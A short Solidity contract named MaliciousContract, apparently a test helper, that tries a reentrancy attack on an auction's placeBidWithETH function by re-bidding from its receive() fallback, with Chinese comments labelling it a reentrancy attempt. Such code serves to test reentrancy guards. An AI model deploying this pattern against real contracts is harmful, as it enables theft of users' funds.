// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IAution {
    function placeBidWithETH() external payable;
}

contract MaliciousContract {
    IAution public auction;
    
    constructor(address _auction) {
        auction = IAution(_auction);
    }
    
    function attack() external payable {
        // 尝试重入攻击
        auction.placeBidWithETH{value: msg.value}();
    }
    
    receive() external payable {
        // 在接收ETH时尝试重入
        auction.placeBidWithETH{value: msg.value}();
    }
} 